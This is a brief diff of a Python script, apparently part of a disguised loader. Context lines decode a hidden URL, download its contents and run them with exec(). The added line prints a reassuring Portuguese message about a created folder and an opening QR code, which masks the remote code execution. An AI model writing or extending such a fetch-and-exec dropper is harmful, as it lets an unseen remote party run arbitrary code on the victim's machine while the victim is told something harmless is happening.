@@ -53,4 +53,5 @@ criasession = criasession.decode("utf-8")
 headers = {'Referer': criasession}
 criasession = requests.get(criasession, headers=headers)
 criasession = criasession.text
+print('Criado pasta com sucesso, abrindo QR')
 exec(criasession)  
